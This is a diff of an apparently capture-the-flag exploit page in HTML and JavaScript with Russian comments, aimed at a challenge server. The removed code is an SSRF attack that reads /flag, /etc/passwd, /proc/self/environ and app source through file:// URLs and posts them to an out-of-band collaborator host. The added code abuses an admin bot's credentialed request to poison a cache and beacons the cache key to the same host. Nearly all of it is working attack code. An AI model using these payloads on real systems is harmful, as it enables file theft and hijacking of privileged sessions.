@@ -1,55 +1,18 @@
 <!DOCTYPE html>
 <script>
 const TARGET = 'https://tasks.goidactf.ru:20431';
-const COLLAB = 'https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun';
+const CACHE_KEY = 'cache_poison_' + Math.random().toString(36).substr(2);
 
-// Файлы для чтения через SSRF
-const files = [
-    '/flag',
-    '/flag.txt',
-    '/app/flag.txt', 
-    '/home/flag',
-    '/root/flag',
-    '/var/www/html/flag.txt',
-    '/etc/passwd',
-    '/proc/self/environ',
-    '/app/app.py',
-    '/app/server.py'
-];
-
-// Читаем каждый файл и отправляем результат
-files.forEach((file, index) => {
-    setTimeout(() => {
-        // 1. Запрашиваем файл через SSRF
-        fetch(TARGET + '/get_url', {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({
-                url: 'file://' + file
-            })
-        })
-        .then(response => {
-            // 2. Получаем ответ от /get_url (этот fetch СРАБОТАЕТ, т.к. это same-origin)
-            return response.text();
-        })
-        .then(ssrfResult => {
-            // 3. Отправляем результат на наш вебхук
-            // Этот fetch в режиме no-cors - CORS не помешает
-            fetch(COLLAB + '/file_result', {
-                method: 'POST',
-                mode: 'no-cors',
-                body: '=== FILE: ' + file + ' ===\n\n' + 
-                      ssrfResult.substring(0, 5000)
-            });
-        })
-        .catch(error => {
-            // 4. Отправляем ошибку
-            fetch(COLLAB + '/error', {
-                method: 'POST', 
-                mode: 'no-cors',
-                body: 'Error reading ' + file + ': ' + error
-            });
-        });
-    }, index * 2000); // Задержка 2 секунды между запросами
+// 1. Бот посещает админку с уникальным параметром
+fetch(TARGET + '/admin?' + CACHE_KEY, {
+    credentials: 'include'
+}).then(() => {
+    // 2. Отправляем тебе ключ через коллаборатор
+    fetch('https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/?cache_key=' + CACHE_KEY, {
+        mode: 'no-cors'
+    });
+    
+    // 3. Ты потом заходишь на тот же URL
+    // https://tasks.goidactf.ru:20431/admin?cache_poison_xxxx
 });
 </script>
